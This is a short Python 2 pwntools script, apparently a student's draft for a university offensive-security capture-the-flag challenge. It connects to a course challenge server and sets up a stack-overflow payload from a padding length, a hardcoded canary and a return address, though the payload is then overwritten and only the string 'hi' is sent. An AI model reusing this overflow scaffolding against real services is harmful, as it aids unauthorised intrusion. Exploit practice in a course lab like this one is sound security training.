#!/usr/bin/env python2

from pwn import *
import time
import struct

PADDING = 136
canary = [0x00, 0xd1, 0x3b, 0x71, 0x9c, 0x1e, 0x87, 0xc8]

#challenge-specific info
host = 'offsec-chalbroker.osiris.cyber.nyu.edu'
port = 1341
netid='pk1898'
r = remote(host, port)
r.sendline(netid)
r.readline()
r.recvuntil(":")
#DATA = 'A' * 8
DATA = '&'
DATA += p64(0x004005b0)
DATA = "hi"
print DATA
print ''
r.sendline(DATA)
print r.recvuntil("hi")

# # print r.readline()
# received = r.recvuntil("and goodbye!")

# if "and goodbye!" in received:
#     print "it's there!!"